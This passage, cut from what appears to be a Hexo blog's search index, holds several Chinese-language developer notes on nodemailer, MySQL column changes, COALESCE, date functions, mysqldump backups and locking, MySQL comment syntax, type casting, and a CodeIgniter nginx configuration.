class=\"subst\">$&#123;data.no&#125;</span>&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        `</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">let</span> mailOptions = &#123;</span><br><span class=\"line\">          <span class=\"keyword\">from</span>: mail_from,</span><br><span class=\"line\">          to: mail_to,     <span class=\"comment\">//寄送人</span></span><br><span class=\"line\">          subject: subject,</span><br><span class=\"line\">          html: email_template,</span><br><span class=\"line\">          attachments: [&#123;</span><br><span class=\"line\">            filename: data.img,</span><br><span class=\"line\">            path: data.img,</span><br><span class=\"line\">            cid: <span class=\"string\">'00000001'</span>+data.img</span><br><span class=\"line\">          &#125;]</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        </span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"comment\">// verify connection configuration</span></span><br><span class=\"line\">      <span class=\"comment\">// transporter.verify(function(error, success) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   if (error) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//        console.log(error);</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125; else &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//        console.log('Server is ready to take our messages');</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125;</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125;);</span></span><br><span class=\"line\">      </span><br><span class=\"line\">      transporter.sendMail(mailOptions, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">error, info</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (error) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(<span class=\"string\">'mail_to:'</span> + mail_to)</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(mail_to + <span class=\"string\">' , Email sent: '</span> + info.response);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      </span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n","categories":["Nodejs"],"tags":["nodejs","mail"]},{"title":"mariadb/mysql修改欄位可能要注意的事情","url":"/blog/2019/02/18/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>最近修改 null 欄位改成非 null 欄位<br>在測試環境上修改欄位通過<br>但到正式環境就沒通過<br>卡了很久整理一下，一些問題</p>\n<a id=\"more\"></a>\n<h2 id=\"MySQL、MariaDB\"><a href=\"#MySQL、MariaDB\" class=\"headerlink\" title=\"MySQL、MariaDB\"></a>MySQL、MariaDB</h2><p>在一般實作 int(null)-&gt;int(not null)<del>，null 值都會自動轉乘<code>0</code></del>，舊版可能會自動轉，MySQL 8.0 不會自動轉，會報<code>Invalid use of NULL value</code> varchar,datetime(null) -&gt;(not null)，會報錯誤 <code>Invalid use of NULL value</code></p>\n<p>但 int 有找到下<br><a href=\"https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values\" target=\"_blank\" rel=\"noopener\">MySQL alter table modify column failing at rows with null values - Stack Overflow</a></p>\n<p><a href=\"https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/122336/\" target=\"_blank\" rel=\"noopener\">MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿</a><br><a href=\"https://xyz.cinc.biz/2015/07/mysql-partition.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: MySQL 資料表分區(partition)</a></p>\n<h2 id=\"ignore\"><a href=\"#ignore\" class=\"headerlink\" title=\"ignore\"></a>ignore</h2><p><code>alter ignore table</code><br><a href=\"https://stackoverflow.com/questions/7828440/mysql-alter-table-modify-column-failing-at-rows-with-null-values\" target=\"_blank\" rel=\"noopener\">MySQL alter table modify column failing at rows with null values - Stack Overflow</a><br>不過剛剛發現 MySQL 5.7 這個就不能用了…<br>MariaDB 還可以<br>varchar(null) -&gt; 空字串</p>\n<p>還發現很奇怪的是，MySQL 到後面版本有<code>NO_ZERO_IN_DATE，NO_ZERO_DATE，TRADITIONAL</code></p>\n<p>所以可能還是需要自己手動把 null 改成有值<br>雖然<code>ignore</code>好像能處理<br>但有可能會早成資料遺失的可能(修改 index)</p>\n<p>測試 sql</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> <span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span> <span class=\"string\">`test`</span>;</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`test`</span> (</span><br><span class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> AUTO_INCREMENT,</span><br><span class=\"line\">  <span class=\"string\">`a`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">10</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">  <span class=\"string\">`b`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>)</span><br><span class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=latin1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> <span class=\"string\">`test`</span> (<span class=\"string\">`id`</span>, <span class=\"string\">`a`</span>, <span class=\"string\">`b`</span>) <span class=\"keyword\">VALUES</span></span><br><span class=\"line\">(<span class=\"number\">1</span>,\t<span class=\"literal\">NULL</span>,\t<span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 2019-02-18 13:06:14</span></span><br></pre></td></tr></table></figure>\n<p>可自己嘗試修改 a,b 欄位測試看看</p>\n<p>其他資料<br><a href=\"https://blog.csdn.net/jiangshouzhuang/article/details/43925763\" target=\"_blank\" rel=\"noopener\">alter ignore table 添加 unique key - 菠萝大数据梦工厂（Free World） - CSDN 博客</a><br><a href=\"http://play-php.blogspot.com/2016/06/mysql.html\" target=\"_blank\" rel=\"noopener\">MySQL 刪除重複的資料,只留下一筆資料 | 我的 PHP 冒險之路</a><br><a href=\"https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/122336/\" target=\"_blank\" rel=\"noopener\">MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿</a></p>\n"},{"title":"mysql COALESCE 取代null值好方法","url":"/blog/2018/07/19/mysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95/","content":"<p>之前前公司有用db2 value，現在用MySQL，找不太到類似與法<br>不過在IBM文件看到<a href=\"https://www.ibm.com/support/knowledgecenter/en/SSEPEK_11.0.0/sqlref/src/tpc/db2z_bif_value.html\" target=\"_blank\" rel=\"noopener\">IBM Knowledge Center - VALUE</a>這語法類似COALESCE<br>這麼實用的東西，當然不能忘記XD<br><a id=\"more\"></a></p>\n<p>value(xxx,ooo)<br>假如xxx是null就帶入後面的值</p>\n<p>COALESCE(xxx,ooo,zzz,fff,…)<br>同上面一樣方法，xxx為null的話，判斷下一個(ooo)是不是為null，ooo為null再繼續判斷下去</p>\n<p>db2 value(xx,ooo)  &amp; COALESCE</p>\n<p>參考來源:<br><a href=\"http://sharedderrick.blogspot.com/2012/06/t-sql-coalesce.html\" target=\"_blank\" rel=\"noopener\">德瑞克：SQL Server 學習筆記: SQL Server：認識 COALESCE() 函數</a><br><a href=\"https://www.ibm.com/support/knowledgecenter/en/SSEPEK_11.0.0/sqlref/src/tpc/db2z_bif_value.html\" target=\"_blank\" rel=\"noopener\">IBM Knowledge Center - VALUE</a></p>\n","categories":["MySQL"],"tags":["mysql","sql","value","coalesce"]},{"title":"mysql date和date_format小記","url":"/blog/2018/12/24/mysql-date%E5%92%8Cdate-format%E5%B0%8F%E8%A8%98/","content":"<p>平常我都是用 date()<br>但今天看到程式使用 date_format()<br>好奇這兩個差異</p>\n<a id=\"more\"></a>\n<p>其實下面兩個都可以顯示時間<br>參數第一個不管用 date,datetime 都不會有錯誤問題<br><a href=\"https://stackoverflow.com/questions/50939499/how-to-optimize-mysql-group-by-with-date-format\" target=\"_blank\" rel=\"noopener\">sql - How to optimize mysql group by with DATE_FORMAT - Stack Overflow</a><br>效能上其實兩者沒太大差別(如上連結)</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">date_format</span>( <span class=\"string\">'2018-01-32 00:00:00'</span> + <span class=\"built_in\">INTERVAL</span> <span class=\"number\">1</span> <span class=\"keyword\">DAY</span>,<span class=\"string\">'%Y%-%m-%d'</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">date</span>( <span class=\"string\">'2018-01-32 00:00:00'</span>);</span><br></pre></td></tr></table></figure>\n<p>之後有發現甚麼在來記錄</p>\n<p>參考連結</p>\n<ul>\n<li><a href=\"https://www.vertabelo.com/blog/technical-articles/what-datatype-should-you-use-to-represent-time-in-mysql-we-compare-datetime-timestamp-and-int\" target=\"_blank\" rel=\"noopener\">MySQL Date Format: What Datatype Should You Use? We Compare Datetime, Timestamp and INT.</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Database/M.1379428749.A.7E8.html\" target=\"_blank\" rel=\"noopener\">Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊</a></li>\n<li><a href=\"https://stackoverflow.com/questions/13507642/mysql-date-comparison-with-date-format\" target=\"_blank\" rel=\"noopener\">mysql date comparison with date_format - Stack Overflow</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_date\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.5/en/date-and-time-literals.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.5 Reference Manual :: 9.1.3 Date and Time Literals</a></li>\n<li><a href=\"http://hant.ask.helplib.com/mysql/post_2073079\" target=\"_blank\" rel=\"noopener\">mysql 日期与 date<em>format 的比较_date</em>帮酷编程问答</a></li>\n<li><a href=\"https://paiza.io/projects/e0Vw8A5Q4qB1Wa9HZtvzjA?language=mysql\" target=\"_blank\" rel=\"noopener\">(MySQL) | Online editor and compiler</a></li>\n<li><a href=\"https://blog.csdn.net/u011820505/article/details/79756652\" target=\"_blank\" rel=\"noopener\">mysql 时间字段性能比较 - u011820505的博客 - CSDN博客</a></li>\n</ul>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"mysqldump可能會失敗原因小記","url":"/blog/2019/01/05/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/","content":"<p>最近出現有 mysqldump 備份失敗問題<br>但也不知道是什麼原因導至失敗<br>不過這邊蒐集一些資訊</p>\n<a id=\"more\"></a>\n<h2 id=\"蒐集相關資料\"><a href=\"#蒐集相關資料\" class=\"headerlink\" title=\"蒐集相關資料\"></a>蒐集相關資料</h2><p>蒐集一些資訊</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/dba_waterbin/article/details/8810339\" target=\"_blank\" rel=\"noopener\">mysqldump：常用操作、案例分享、意外终止的原因以及解决方法 - 记录创业路上的一些想法 - CSDN 博客</a></li>\n<li><a href=\"http://www.cnblogs.com/kerrycode/p/7388968.html\" target=\"_blank\" rel=\"noopener\">MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3230693/get-locked-tables-in-mysql-query\" target=\"_blank\" rel=\"noopener\">Get locked tables in mysql query - Stack Overflow</a></li>\n<li><a href=\"http://www.cnblogs.com/kerrycode/p/7388968.html\" target=\"_blank\" rel=\"noopener\">MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园</a></li>\n<li><a href=\"https://lhdst-163-com.iteye.com/blog/2117083\" target=\"_blank\" rel=\"noopener\">mysql lock tables - 無執 - ITeye 博客</a></li>\n<li><a href=\"http://myrock.github.io/2014/11/20/mysql-waiting-for-table-flush/\" target=\"_blank\" rel=\"noopener\">[MySQL 案例]之备份与 Waiting for table flush | HiDBA | 林晓嘉</a></li>\n<li><a href=\"https://www.jianshu.com/p/d676b763c747\" target=\"_blank\" rel=\"noopener\">MySQL 的 SQL_CALC_FOUND_ROWS - 简书</a></li>\n</ul>\n<h2 id=\"簡單小記\"><a href=\"#簡單小記\" class=\"headerlink\" title=\"簡單小記\"></a>簡單小記</h2><p>首先有看到 processlist 有一個<code>Waiting for table flush</code><br>目前猜測可能是做 mysqldump 的時候，做 select 查詢可能會卡住<br>詳細原因還不清楚</p>\n<h3 id=\"備份-MySQL-方法\"><a href=\"#備份-MySQL-方法\" class=\"headerlink\" title=\"備份 MySQL 方法\"></a>備份 MySQL 方法</h3><ul>\n<li><a href=\"https://blog.longwin.com.tw/2005/12/rsync_ssh_backup/\" target=\"_blank\" rel=\"noopener\">rsync 備份 | Tsung’s Blog</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/questions/10091279\" target=\"_blank\" rel=\"noopener\">在 Linux 上，關於 Mysql 備份，什麼方式最好呢？ tar 方式好久！ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n<p>感覺 rsync 指令好像滿好用的，改天來學一下如何用</p>\n","categories":["MySQL"],"tags":["mysql","mysqldump"]},{"title":"mysqldump備份database固定量資料","url":"/blog/2019/04/25/mysqldump%E5%82%99%E4%BB%BDdatabase%E5%9B%BA%E5%AE%9A%E9%87%8F%E8%B3%87%E6%96%99/","content":"<p>最近要本機測試資料<br>但是要如何不中斷服務又能快速備份的方法<br>最後想到有 mysqldump</p>\n<a id=\"more\"></a>\n<p>之前有想過 mysqldump 是 DBA 才會用到工具<br>但我又不需要全部備份<br>不知道有沒有什麼快速匯出但是數量不想要太多<br>最後有找到很快的方法</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><p><code>mysqldump -uroot -p123 test &gt; c:\\test.sql</code><br><strong>注意-u 和-p 後面帳號密碼要連在一起</strong><br>參考:<a href=\"http://koibear.blogspot.com/2012/11/windowscommand-line-dump-import-mysql.html\" target=\"_blank\" rel=\"noopener\">鯉魚智缺熊的網智: windows 下使用 command line dump &amp; import mysql</a></p>\n<p>但注意!!用 mysqldump 是會 lock DB 的</p>\n<blockquote>\n<p>MyISAM tables require this locking because they don’t support transactions. However, InnoDB (the default storage engine as of MySQL 5.5.5) supports transactions. Mysqldump defaults to a conservative setting of locking everything, but we don’t need to use that default - we an avoid locking tables completely.<br><a href=\"https://serversforhackers.com/c/mysqldump-with-modern-mysql\" target=\"_blank\" rel=\"noopener\">Mysqldump with Modern MySQL | Servers for Hackers</a></p>\n</blockquote>\n<h2 id=\"限制每個-table-數量\"><a href=\"#限制每個-table-數量\" class=\"headerlink\" title=\"限制每個 table 數量\"></a>限制每個 table 數量</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysqldump -u [username] -p [dbname] &#123;--opt&#125; --<span class=\"built_in\">where</span>=<span class=\"string\">\"true limit 100\"</span> &gt; dump.sql</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://serverfault.com/questions/173834/mysql-dump-of-talble-limit-100\" target=\"_blank\" rel=\"noopener\">mysql dump of talble limit 100 - Server Fault</a></p>\n<blockquote>\n<p>如果運行 mysqldump 沒有–quick 或–opt 選項，mysqldump 在轉儲結果前將整個結果集裝入內存。如果轉儲大資料庫可能會出現問題。該選項預設啟用，但可以用–skip-opt 禁用。</p>\n</blockquote>\n<p><a href=\"https://jax-work-archive.blogspot.com/2009/07/mysqldump-51-mysql.html\" target=\"_blank\" rel=\"noopener\">Jax 的工作紀錄: (轉載)mysqldump 5.1 資料備份詳細指令 [MySQL]</a></p>\n<blockquote>\n<p>–opt 　　　是 mysqldump 中的預設參數，參數功能相等於加入了 –add-drop-table –add-locks –create-options –disable-keys –extended-insert –-lock-tables –quick –set-charset 等參數</p>\n</blockquote>\n<p><a href=\"https://fmbase.tw/blog/2013/01/23/mysql%E5%88%A9%E7%94%A8mysqldump%E5%82%99%E4%BB%BD/\" target=\"_blank\" rel=\"noopener\">[MySQL]利用 mysqldump 備份 – FunMing 基地</a><br><a href=\"https://blog.51cto.com/imysql/1879753\" target=\"_blank\" rel=\"noopener\">FAQ 系列 | mysqldump 选项之 skip-opt-老叶茶馆-51CTO 博客</a></p>\n<h2 id=\"鎖表解決方法\"><a href=\"#鎖表解決方法\" class=\"headerlink\" title=\"鎖表解決方法\"></a>鎖表解決方法</h2><p>解決方法是用<code>–skip-lock-tables</code></p>\n<blockquote>\n<p>一、mysqldump 在備份數據庫時鎖表的問題<br>在使用’mysqldump’工具在備份庫表時，會對庫表進行鎖定，這會對業務的運行產生一定的影響；對於鎖表的過程及解決方法，作者也談談自己的認識。<br>緩解鎖定的方法：<br>1、Use –skip-lock-tables mysqldump option. Your tables won’t be locked, but your backup might be not consistent (depends on your schema: if your database transactions touch several tables at once, and one table is already backed up and other is not. For example: two tables: customers and orders. If customers is backed up first, and then new customer/order pair is inserted, you might end up with order without customer in your backup).<br>This problem is primary reason why mysqldump locks all tables by default. If this issue does not apply to you, skipping the table locking in mysql is the most simple solution.<br>會影響數據的一致性(可能比丟數據還要遭糕)，故不推薦使用這個方法。<br>2、Use some other backup method. For example: Flush tables with read lock, create LVM snapshot, unlock tables, mount your LVM snapshot and back up your data. This gets quickly, much more complex than simple mysqldump.<br>If your MySQL data is not on a LVM volume, you can create a slave MySQL server and back it up, without touching the master, so locking occurs on the slave and master is always free.<br>可以參考「lvm 備份 mysql 數據庫參考」，這篇文章。</p>\n</blockquote>\n<p><a href=\"http://www.freeoa.net/osuport/db/mysqldump-lock-on-backup_1453.html\" target=\"_blank\" rel=\"noopener\">mysqldump 在备份数据库的问题集-FreeOA</a></p>\n<h2 id=\"最後-SQL\"><a href=\"#最後-SQL\" class=\"headerlink\" title=\"最後 SQL\"></a>最後 SQL</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysqldump -uroot -p123 <span class=\"built_in\">test</span> –skip-lock-tables  &gt; c:\\test.sql</span><br></pre></td></tr></table></figure>\n<p>其他參考來源:<br><a href=\"https://www.cnblogs.com/xiaoboluo768/p/7560105.html\" target=\"_blank\" rel=\"noopener\">mysqldump 与 innobackupex 备份过程你知多少 - xiaoboluo768 - 博客园</a><br><a href=\"https://stackoverflow.com/questions/38495460/mysql-database-export-100-rows-from-each-table-in-a-database\" target=\"_blank\" rel=\"noopener\">MySQL Database Export (100 Rows from each table in a database) - Stack Overflow</a> &lt;—這個我沒有嘗試<br><a href=\"https://blog.longwin.com.tw/2018/08/mysql-database-mysqldump-dump-sample-dataset-2018/\" target=\"_blank\" rel=\"noopener\">使用 mysqldump 倒出 MySQL 所有資料庫(表) 固定筆數的資料 | Tsung’s Blog</a></p>\n","categories":["MySQL"],"tags":["mysql","mysqldump"]},{"title":"mysqldump  匯出 CSV 方法小記","url":"/blog/2020/02/19/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>這篇只記錄，尚未測試</p>\n<a id=\"more\"></a>\n<h2 id=\"secure-file-priv\"><a href=\"#secure-file-priv\" class=\"headerlink\" title=\"secure_file_priv\"></a>secure_file_priv</h2><p><a href=\"https://www.cnblogs.com/ding2016/p/9548528.html\" target=\"_blank\" rel=\"noopener\">利用mysqldump命令导出为csv格式文件 - Adrian·Ding - 博客园</a></p>\n<h2 id=\"csvdump\"><a href=\"#csvdump\" class=\"headerlink\" title=\"csvdump\"></a>csvdump</h2><p><a href=\"https://github.com/manticorp/CSVDump\" target=\"_blank\" rel=\"noopener\">manticorp/CSVDump: A fast, effective and reliable tool for dumping CSV files into a MySQL database.</a></p>\n<p><a href=\"https://github.com/bobby96333/csvdump\" target=\"_blank\" rel=\"noopener\">bobby96333/csvdump: remote dump data from mysql</a></p>\n<p>有查到這兩個，感覺都不錯用</p>\n","categories":["SQL"],"tags":["mysql","csv","sql"]},{"title":"mysql備份遇到#mysql50#不能匯出的問題","url":"/blog/2019/05/10/mysql%E5%82%99%E4%BB%BD%E9%81%87%E5%88%B0-mysql50-%E4%B8%8D%E8%83%BD%E5%8C%AF%E5%87%BA%E7%9A%84%E5%95%8F%E9%A1%8C/","content":"<p>今天專案做 mysqldump 時候，遇到<code>#mysql50#...</code>資料表不能備份<br>等一下，DB 裡面沒有這個資料表<br>後來我同事再網路找到了原因</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>都报错，后来发现，mysql 用户的\\$HOME 目录下有目录.ssh 导致的问题。</p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/levy_cui/article/details/51395995\" target=\"_blank\" rel=\"noopener\">mysql 数据库中出现#mysql50#.ssh 处理方法 - 花名:白起 - CSDN 博客</a></p>\n<p>刪除.ssh 資料夾就能解決<br>這個雷也太… 囧</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"mysql查詢使用--註解踩到的雷","url":"/blog/2018/04/18/mysql%E6%9F%A5%E8%A9%A2%E4%BD%BF%E7%94%A8-%E8%A8%BB%E8%A7%A3%E8%B8%A9%E5%88%B0%E7%9A%84%E9%9B%B7/","content":"<p>因為先前工作是使用DB2<br>不過…最近新的工作使用Mysql</p>\n<p>發現竟然<code>--</code>註解不能用…</p>\n<a id=\"more\"></a>\n<p>Google一下，原來MySQL註解有3種</p>\n<ol>\n<li>#</li>\n<li>/**/</li>\n<li>--   (但這種前後要留白)   ex : – test</li>\n</ol>\n<p>希望下次不要踩到一樣的雷XD</p>\n","categories":["程式心法"],"tags":["mysql","comment","註解"]},{"title":"mysql字串自動轉數字小記","url":"/blog/2019/01/17/mysql%E5%AD%97%E4%B8%B2%E8%87%AA%E5%8B%95%E8%BD%89%E6%95%B8%E5%AD%97%E5%B0%8F%E8%A8%98/","content":"<p>最近用 MySQL 做時間比較<br>想做<code>datetime欄位(0000-00-00 00:00:00) &gt; &#39;&#39;</code><br>結果得出來結果是<code>0</code></p>\n<a id=\"more\"></a>\n<p>之前知道 SQL 沒有 boolean<br>不過在做時間比較<br>發現很奇怪<br>怎麼跟空字串比較結果為<code>0</code></p>\n<!--more-->\n<p>Google 一下<br>發現原來 MySQL 會做自動轉型</p>\n<p><code>0 = &#39;&#39;</code>為<code>1</code><br>原來空字串會自動轉成<code>0</code><br>所以才會得出這個結果<br>這個不常做，感覺很容易忘記</p>\n<p>2019-06-10</p>\n<p>最近發現 null 時候，做 where 條件(大於、小於)不會抓到<br>但是 0000-00-00 可以<br>所以這是為什麼大家都會這樣用?!<br>但這樣做 add_date 時候就會有問題<br>有優點也有缺點</p>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true\" target=\"_blank\" rel=\"noopener\">mysql: why comparing a ‘string’ to 0 gives true? - Stack Overflow</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html#operator_equal\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 12.3.2 Comparison Functions and Operators</a></li>\n<li><a href=\"https://stackoverflow.com/questions/21762075/mysql-automatically-cast-convert-a-string-to-a-number\" target=\"_blank\" rel=\"noopener\">type conversion - MySQL automatically cast/convert a string to a number? - Stack Overflow</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 5.7 Reference Manual :: 12.2 Type Conversion in Expression Evaluation</a></li>\n</ul>\n"},{"title":"nginx設定小記","url":"/blog/2019/04/07/nginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/","content":"<p>最近專案開始有使用 Nginx<br>之前沒有什麼機會用到<br>所以對設定也不是很清楚<br>趁這個機會整理</p>\n<a id=\"more\"></a>\n<p>這邊有爬到<a href=\"https://nginxconfig.io/\" target=\"_blank\" rel=\"noopener\">nginxconfig.io</a><br>可以簡單設定 nginx 設定<br>這篇主要是紀錄目前專案有用到的設定</p>\n<p>先分享最近專案用的 Codeigniter 的 nginx 設定檔</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    index index.php index.html;</span><br><span class=\"line\">    server_name localhost;</span><br><span class=\"line\">    error_log  /var/log/nginx/error.log;</span><br><span class=\"line\">    access_log /var/log/nginx/access.log;</span><br><span class=\"line\">    root /usr/local/nginx/html;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        try_files $uri $uri/ /index.php;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location ~  ^.+\\.php &#123;</span><br><span class=\"line\">        fastcgi_pass   php-fpm:9000;</span><br><span class=\"line\">        fastcgi_index  index.php;</span><br><span class=\"line\">        fastcgi_split_path_info ^(.+\\.php)(.*)$;</span><br><span class=\"line\">        fastcgi_param   PATH_INFO $fastcgi_path_info;</span><br><span class=\"line\">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class=\"line\">        fastcgi_param    PATH_TRANSLATED    $document_root$fastcgi_path_info;</span><br><span class=\"line\">        include        fastcgi_params;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # unless the request is for a valid file (image, js, css, etc.), send to bootstrap</span><br><span class=\"line\">    if (!-e $request_filename)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        rewrite ^/(.*)$ /index.php?/$1 last;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最近專案使用<a href=\"http://matt7137.pixnet.net/blog/post/42754388-codeigniter%E5%9C%A8nginx%E4%B8%8A%E8%A8%AD%E5%AE%9Arewrite%E7%9A%84%E6%96%B9%E6%B3%95\" target=\"_blank\" rel=\"noopener\">Codeigniter 在 nginx 上設定 rewrite 的方法 @ 秋風落葉、萍水相逢 - Matt 網頁製作 生活旅遊 日誌 :: 痞客邦 ::</a></p>\n<h2 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h2><blockquote>\n<p>語法規則<br>location [ = | ~ | ~<em> | ^~ ] uri { … }<br>location @name { … }<br>語法規則很簡單，一個 location 關鍵字，後面跟著可選的修飾符，後面是要匹配的字符，花括號中是要執行的操作。<br>修飾符<br>= 表示精確匹配。只有請求的 url 路徑與後面的字符串完全相等時，才會命中。<br>~ 表示該規則是使用正則定義的，區分大小寫。<br>~\\</em> 表示該規則是使用正則定義的，不區分大小寫。<br>^~ 表示如果該符號後面的字符是最佳匹配，採用該規則，不再進行後續的查找。</p>\n</blockquote>\n<p>參考來源<br><a href=\"https://segmentfault.com/a/1190000013267839\" target=\"_blank\" rel=\"noopener\">一文弄懂 Nginx 的 location 匹配 - 個人文章 - SegmentFault 思否</a> <a href=\"/blog/2019/04/07/nginx設定小記/location_1.png\" title=\"備份圖\">備份圖</a></p>\n<blockquote>\n<p>location 順序/優先級：<br>(location =) &gt; (location 完整路徑) &gt; (location ^~ 路徑) &gt; (location ~,~* 正則順序) &gt; (location 部分起始路徑) &gt; (/)</p>\n</blockquote>\n<p>參考來源<br><a href=\"https://my.oschina.net/foreverich/blog/800359\" target=\"_blank\" rel=\"noopener\">nginx 中 location 的顺序(优先级)及 rewrite 规则写法 - 永福的博客 - 开源中国</a></p>\n<h2 id=\"root\"><a href=\"#root\" class=\"headerlink\" title=\"root\"></a>root</h2><p>簡單來說就是放的程式路徑</p>\n<blockquote>\n<p>root 是指定項目的根目錄，適用與 server 和 location。可以指定多個，如果 locaiton 沒有指定，會往其外層的 server 或 http 中尋找繼承。</p>\n</blockquote>\n<p>更多內容可以看<a href=\"https://www.jianshu.com/p/4be0d5882ec5\" target=\"_blank\" rel=\"noopener\">Nginx 靜態服務配置—詳解 root 和 alias 指令 - 簡書</a> <a href=\"/blog/2019/04/07/nginx設定小記/root_1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"try-files\"><a href=\"#try-files\" class=\"headerlink\" title=\"try_files\"></a>try_files</h2><p>這個函示有些 rewrite 可以套用在這功能上面<br>簡單檔案不存在的時候，可以自己設定指定到某一隻檔案<br>但要注意那個檔案需要存在，否則會 ERROR</p>\n<p>看到網路上有人拿來做 cache</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">        # 